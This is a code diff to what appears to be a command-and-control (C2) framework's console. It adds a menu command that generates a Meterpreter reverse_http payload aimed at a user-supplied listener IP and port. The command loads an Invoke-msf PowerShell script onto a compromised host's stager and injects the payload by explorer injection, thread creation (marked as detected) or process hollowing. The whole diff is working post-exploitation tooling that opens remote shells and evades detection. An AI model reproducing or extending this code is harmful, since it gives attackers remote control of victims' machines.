@@ -524,6 +524,8 @@ class mymainclass():
                         self.__t_myserver.create_command(user_input_stager,"psload",t_result)
                         #update the list
                         self.__t_myserver.add_psloadlist(user_input_stager,"Get-ProcessTree.ps1")
+                    else:
+                        print("Get-ProcessTree already loaded")
 
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETPSTREE)
                     continue
@@ -543,6 +545,8 @@ class mymainclass():
                         self.__t_myserver.create_command(user_input_stager,"psload",t_result)
                         #update the list
                         self.__t_myserver.add_psloadlist(user_input_stager,"Get-ProcessTree.ps1")
+                    else:
+                        print("Get-ProcessTree already loaded")
 
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETPSTREE2)
                     continue
@@ -998,6 +1002,50 @@ class mymainclass():
                         self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.ARSREP)
 
                     continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_MSF:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    
+                    #disable verbose
+                    self.__t_myserver.set_verbose(False)
+                    
+                    removecomplete()
+                    user_input_host = input("Please enter msf listener ip: ")
+                    user_input_port = input("Please enter msf listener port: ")
+
+                    print("windows/x64/meterpreter/reverse_http will be used ...")
+
+
+                    #gen msf
+                    t_mypayloadgen = payloadgen.mypayloadgen()
+                    t_mypayloadgen.gen_msf(user_input_host, user_input_port)
+
+                    if ("Invoke-msf.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-msf.ps1")
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-msf.ps1")
+                    else:
+                        print("MSF already loaded")
+
+                    removecomplete()
+                    print("Tech list: ")
+                    print("1: inject into explorer")
+                    print("2: create thread (detected) ")
+                    print("3: process hollowing")
+
+                    user_input_tech = input("Please enter tech id: ")
+                    self.__t_myserver.create_command(user_input_stager,"ps","Invoke-msf {}".format(user_input_tech))
+
+                    continue
+
 
             if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                 # menu switch
